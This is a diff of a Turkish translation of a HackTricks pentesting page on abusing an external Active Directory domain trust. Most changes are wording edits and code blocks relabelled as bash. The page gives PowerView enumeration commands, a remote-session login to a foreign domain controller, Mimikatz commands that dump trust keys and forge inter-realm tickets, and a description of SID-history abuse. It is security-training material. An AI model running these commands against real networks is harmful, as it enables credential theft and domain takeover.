@@ -2,12 +2,12 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Bu senaryoda bir dış alan size güveniyor (veya her ikisi de birbirine güveniyor), bu nedenle üzerinde bir tür erişim elde edebilirsiniz.
+Bu senaryoda, bir dış alan size güveniyor (veya her ikisi de birbirine güveniyor), bu nedenle üzerinde bir tür erişim elde edebilirsiniz.
 
 ## Sayım
 
 Öncelikle, **güveni** **saymalısınız**:
-```powershell
+```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
@@ -56,14 +56,14 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-Önceki sayımda, **`crossuser`** kullanıcısının **harici alanın** **DC'sinde** **Admin erişimi** olan **`External Admins`** grubunun içinde olduğu bulundu.
+Önceki numaralandırmada, **`crossuser`** kullanıcısının **dış alanın DC'sinde** **Admin erişimi** olan **`External Admins`** grubunun içinde olduğu bulundu.
 
 ## İlk Erişim
 
-Eğer diğer alandaki kullanıcınızın herhangi bir **özel** erişimini **bulamadıysanız**, yine de AD Metodolojisine geri dönebilir ve **yetkisiz bir kullanıcıdan privesc** denemesi yapabilirsiniz (örneğin kerberoasting gibi):
+Eğer diğer alandaki kullanıcınızın herhangi bir **özel** erişimini bulamadıysanız, AD Metodolojisine geri dönebilir ve **yetkisiz bir kullanıcıdan privesc** denemeye çalışabilirsiniz (örneğin kerberoasting gibi):
 
-**Powerview fonksiyonlarını** kullanarak `-Domain` parametresi ile **diğer alanı** **sayım** yapmak için:
-```powershell
+**Powerview fonksiyonlarını** kullanarak `-Domain` parametresi ile **diğer alanı** **numaralandırabilirsiniz**:
+```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
 {{#ref}}
@@ -75,23 +75,23 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ### Giriş Yapma
 
 Dış domaine erişimi olan kullanıcıların kimlik bilgileriyle normal bir yöntem kullanarak erişim sağlamalısınız:
-```powershell
+```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### SID Tarihi İstismarı
 
 Bir orman güveni üzerinden [**SID Tarihi**](sid-history-injection.md) istismar edebilirsiniz.
 
-Eğer bir kullanıcı **bir ormandan diğerine** taşınmışsa ve **SID Filtreleme etkin değilse**, **diğer ormandan bir SID eklemek** mümkün hale gelir ve bu **SID**, **güven üzerinden** kimlik doğrulama sırasında **kullanıcının jetonuna** **eklenecektir**.
+Bir kullanıcı **bir ormandan diğerine** taşındığında ve **SID Filtrelemesi etkin değilse**, **diğer ormandan bir SID eklemek** mümkün hale gelir ve bu **SID**, **güven üzerinden** kimlik doğrulama sırasında **kullanıcının jetonuna** **eklenecektir**.
 
 > [!WARNING]
 > Hatırlatmak gerekirse, imza anahtarını şu şekilde alabilirsiniz:
 >
-> ```powershell
+> ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Mevcut alanın kullanıcısını taklit eden bir **TGT**'yi **güvenilir** anahtarla **imzalayabilirsiniz**.
+Mevcut alanın kullanıcısını taklit eden bir **TGT'yi** **güvenilir** anahtarla **imzalayabilirsiniz**.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
